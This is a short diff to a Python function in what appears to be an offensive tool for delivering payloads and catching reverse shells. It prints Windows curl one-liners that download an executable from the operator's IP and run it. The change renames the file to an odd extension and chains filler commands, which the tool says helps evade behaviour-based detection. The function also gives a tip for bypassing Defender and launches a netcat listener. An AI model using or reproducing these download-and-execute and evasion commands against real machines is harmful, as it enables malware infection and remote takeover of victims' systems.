@@ -165,9 +165,9 @@ def run_http():
 	subprocess.run(http_serv, shell=True)
 
 def run_netcat(ip, source_file, port):
-	print(f"\n[-----+++++-----]\n\nWindows Commands To Transfer File:\n\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o myapp.exe {Colors.ENDC}\n\nTransfer and Execute (Behaviour Detections Will Likely Flag This As Malicious)")
+	print(f"\n[-----+++++-----]\n\nWindows Commands To Transfer File:\n\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o myapp.g (cmd will execute any file regardless of the extension as long as it is an executable, which it is) {Colors.ENDC}\n\nTransfer and Execute (Behaviour Detections Will Likely Flag This As Malicious)")
 	time.sleep(1)
-	print(f"\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -O && {source_file}.exe{Colors.ENDC}\n\nTransfer and Execute w/ Random Commands (Can Sometimes Bypass Behaviour Based Detection)\n\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o myapp.exe && ping -n 5 127.0.0.1 > nul && dir > nul && myapp.exe{Colors.ENDC}\n\n[-----+++++-----]")
+	print(f"\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o {source_file}.g && {source_file}.g{Colors.ENDC}\n\nTransfer and Execute w/ Random Commands (Can Sometimes Bypass Behaviour Based Detection)\n\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o myapp.g && ping -n 5 127.0.0.1 > nul && dir > nul && myapp.g{Colors.ENDC}\n\n[-----+++++-----]")
 	print("\nIf Defender is blocking this - change line 117 in the code \"{5}.StandardInput.WriteLine(\"exit;{1}{9}{2}{10}{3}{1}{2}\")")
 	print(f"\n\n{Colors.OKYELLOW}Running nc -lvnp {port}{Colors.ENDC}")
 	netcat_command = f"nc -lvnp {port}"
